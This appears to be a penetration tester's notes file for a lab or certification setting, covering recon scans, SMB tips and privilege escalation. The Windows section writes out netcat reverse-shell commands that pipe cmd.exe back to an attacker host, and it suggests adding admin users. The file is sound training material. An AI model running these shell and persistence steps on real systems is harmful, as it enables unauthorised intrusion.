Viewable here: https://moshekaplan.github.io/pentesting_notes/

Pull requests welcome.

[[_TOC_]]

# Preparing your environment

Clone the following repositories:

* https://github.com/danielmiessler/SecLists
* https://github.com/rebootuser/LinEnum
* https://github.com/superkojiman/onetwopunch

Or as a list of commands:
```
git clone --depth 1 https://github.com/danielmiessler/SecLists.git
git clone --depth 1 https://github.com/rebootuser/LinEnum.git
git clone --depth 1 https://github.com/superkojiman/onetwopunch.git
```

# Starting a pentest

Beginning a pentest against a host? Start with the following commands:

```
nmap -A -sV --script=default,vuln,smb-vuln* -p- --open -oA tcp_10.11.1.x 10.11.1.x
nmap -A -sV -sU --script=default,vuln --open -oA udp_10.11.1.x 10.11.1.x
echo "10.11.1.x" > 10.11.1.x_target.txt && ../tools/onetwopunch.sh  -i tap0 -t 10.11.1.x_target.txt
```

# Protocol specific notes

## HTTP
### Nikto

Use Nikto to scan for vulns
`nikto -o "[OUTPUT].txt" -h [IP] -p [PORT]`

## SMB
For Linux targets running SMB, it may be possible to find a version number in the raw network traffic with Wireshark in
the `smb.native_lanman` field.

# Lessons Learned

## Exploitation

If an exploit looks like it should be succesful, but is failing to connect back with a reverse shell, try cycling through common ports: 80, 443, 8080, 53

Try using other payloads besides reverse shell, if the exploit works. Adding an admin/root user and connecting via SSH/RDP is an alternative to an immediate root shell.

## General Privilege escalation
### Ports for reverse shell
Trying to figure out if a port is available for further connect-back? Try nmap + wireshark

On compromised host, run: `nmap -sV -P0 -p- 10.11.0.57`

On attacker system, use the following wireshark filter: `ip.src == 10.11.1.252 && tcp.flags.syn == 1 && tcp.flags.ack == 0`

### Lazy credentials
If you see lazy passwords in one place of admin/admin, expect that there might be lazy passwords in other places too.


## Windows Privilege escalation

`accesschk.exe /accepteula -c *` for seeing services with RW access, so the service image path itself can be changed.

Sometimes files may be hidden. Use `dir /A` instead of dir.

SMB server on Kali box is easiest way to run/transfer/exfil files. E.g., :
`attacker_system 10.11.0.57$ nc -nvlp 80`
`target_system > \\10.11.0.57\TEST\nc.exe -nv -e cmd.exe 10.11.0.57 80`

After getting a shell, get a second one with "start" in case the first one bugs up/hangs/crashes\
python /usr/share/doc/python-impacket/examples/smbserver.py share  /www
e.g.: start  \\10.11.0.57\share\nc.exe -nv -e cmd.exe 10.11.0.57 80


## Linux Privilege escalation

Colfusion guide: https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers

# Online Resources

* https://github.com/DigitalAftermath/EnumerationVisualized/wiki
* https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
* https://forums.offensive-security.com/showthread.php?4689-Offensive-Security-s-Complete-Guide-to-Alpha
